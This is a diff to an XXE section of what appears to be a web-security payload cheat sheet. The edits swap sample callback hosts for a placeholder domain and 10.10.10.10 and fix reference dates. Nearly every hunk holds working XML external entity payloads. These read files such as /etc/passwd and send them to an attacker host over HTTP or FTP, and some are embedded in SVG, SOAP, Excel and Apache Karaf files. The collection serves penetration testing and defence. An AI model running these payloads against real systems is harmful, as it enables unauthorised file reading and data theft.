@@ -302,7 +302,7 @@ Payloads from [infosec-au/xxe-windows.md](https://gist.github.com/infosec-au/2c6
 ```xml
 <?xml version="1.0" ?>
 <!DOCTYPE message [
-    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
+    <!ENTITY % ext SYSTEM "http://[ATTACKER.DOMAIN.TLD]/ext.dtd">
     %ext;
 ]>
 <message></message>
@@ -343,29 +343,29 @@ Sometimes you won't have a result outputted in the page but you can still extrac
 
 ### Basic Blind XXE
 
-The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.
+The easiest way to test for a blind XXE is to try to load a remote resource such as a callback endpoint controlled by the tester.
 
 ```xml
 <?xml version="1.0" ?>
 <!DOCTYPE root [
-<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
+<!ENTITY % ext SYSTEM "http://[ATTACKER.DOMAIN.TLD]/x"> %ext;
 ]>
 <r></r>
 ```
 
 ```xml
-<!DOCTYPE root [<!ENTITY test SYSTEM 'http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net'>]>
+<!DOCTYPE root [<!ENTITY test SYSTEM 'http://[ATTACKER.DOMAIN.TLD]'>]>
 <root>&test;</root>
 ```
 
-Send the content of `/etc/passwd` to "www.malicious.com", you may receive only the first line.
+Send the content of `/etc/passwd` to `http://[ATTACKER.DOMAIN.TLD]`, you may receive only the first line.
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
-<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
+<!ENTITY callhome SYSTEM "http://[ATTACKER.DOMAIN.TLD]/?%xxe;">
 ]
 >
 <foo>&callhome;</foo>
@@ -377,12 +377,12 @@ Send the content of `/etc/passwd` to "www.malicious.com", you may receive only t
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
+<!DOCTYPE data SYSTEM "http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd">
 <data>&send;</data>
 
-File stored on http://publicServer.com/parameterEntity_oob.dtd
+File stored on http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd
 <!ENTITY % file SYSTEM "file:///sys/power/image_size">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://[ATTACKER.DOMAIN.TLD]/?%file;'>">
 %all;
 ```
 
@@ -392,15 +392,15 @@ File stored on http://publicServer.com/parameterEntity_oob.dtd
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
+<!ENTITY % sp SYSTEM "http://10.10.10.10/dtd.xml">
 %sp;
 %param1;
 ]>
 <r>&exfil;</r>
 
-File stored on http://127.0.0.1/dtd.xml
+File stored on http://10.10.10.10/dtd.xml
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.10.10/dtd.xml?%data;'>">
 ```
 
 ### XXE OOB with Apache Karaf
@@ -412,7 +412,7 @@ CVE-2018-11788 affecting versions:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]
+<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://[ATTACKER.DOMAIN.TLD]"> %dtd;]
 <features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
     <feature name="deployer" version="2.0" install="auto">
@@ -500,7 +500,7 @@ _xxe.svg_:
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
 <!ELEMENT svg ANY >
-<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
+<!ENTITY % sp SYSTEM "http://10.10.10.10:8080/xxe.xml">
 %sp;
 %param1;
 ]>
@@ -522,7 +522,7 @@ _xxe.xml_:
 
 ```xml
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://10.10.10.10:2121/%data;'>">
 ```
 
 ### XXE Inside SOAP
@@ -530,7 +530,7 @@ _xxe.xml_:
 ```xml
 <soap:Body>
   <foo>
-    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
+  <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://10.10.10.10:22/"> %dtd;]><xxx/>]]>
   </foo>
 </soap:Body>
 ```
@@ -597,7 +597,7 @@ Add your blind XXE payload inside `xl/workbook.xml`.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://10.10.10.10:8000/xxe.dtd">%asd;%c;]>
 <cdl>&rrr;</cdl>
 <workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
 ```
@@ -606,7 +606,7 @@ Alternatively, add your payload in `xl/sharedStrings.xml`:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
+<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://10.10.10.10:8000/xxe.dtd">%asd;%c;]>
 <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
 ```
 
@@ -618,7 +618,7 @@ And using FTP instead of HTTP allows to retrieve much larger files.
 
 ```xml
 <!ENTITY % d SYSTEM "file:///etc/passwd">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.10.10.10:2121/%d;'>">
 ```
 
 Serve DTD and receive FTP payload using [staaldraad/xxeserv](https://github.com/staaldraad/xxeserv):
@@ -637,7 +637,7 @@ When all you control is the DTD file, and you do not control the `xml` file, XXE
 <!-- Load the contents of a sensitive file into a variable -->
 <!ENTITY % payload SYSTEM "file:///etc/passwd">
 <!-- Use that variable to construct an HTTP get request with the file contents in the URL -->
-<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://[ATTACKER.DOMAIN.TLD]/x=%payload;">'>
 %param1;
 %external;
 ```
@@ -672,8 +672,8 @@ When all you control is the DTD file, and you do not control the `xml` file, XXE
 - [How we got read access on Google’s production servers - Detectify - April 11, 2014](https://web.archive.org/web/20230902033341/https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/)
 - [Impossible XXE in PHP - Aleksandr Zhurnakov - March 11, 2025](https://web.archive.org/web/20260131091306/https://swarm.ptsecurity.com/impossible-xxe-in-php/)
 - [Midnight Sun CTF 2019 Quals - Rubenscube - jbz - April 6, 2019](https://web.archive.org/web/20260302041500/https://jbz.team/midnightsunctfquals2019/Rubenscube)
-- [OOB XXE through SAML - Sean Melia (@seanmeals) - January 2016](https://web.archive.org/web/20170205151900/https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf)
-- [Payloads for Cisco and Citrix - Arseniy Sharoglazov - January 1, 2016](https://web.archive.org/web/20181213212434/https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
+- [OOB XXE through SAML - Sean Melia (@seanmeals) - February 5, 2017](https://web.archive.org/web/20170205151900/https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf)
+- [Payloads for Cisco and Citrix - Arseniy Sharoglazov - December 13, 2018](https://web.archive.org/web/20181213212434/https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
 - [Pentest XXE - @phonexicum - March 9, 2020](https://web.archive.org/web/20260306152955/https://phonexicum.github.io/infosec/xxe.html)
 - [Playing with Content-Type – XXE on JSON Endpoints - Antti Rantasaari - April 20, 2015](https://web.archive.org/web/20240615071332/https://www.netspi.com/blog/technical-blog/web-application-pentesting/playing-content-type-xxe-json-endpoints/)
 - [REDTEAM TALES 0X1: SOAPY XXE - Uncover and exploit XXE vulnerability in SOAP WS - Optistream - May 27, 2024](https://web.archive.org/web/20240527202144/https://www.optistream.io/blogs/tech/redteam-stories-1-soapy-xxe)
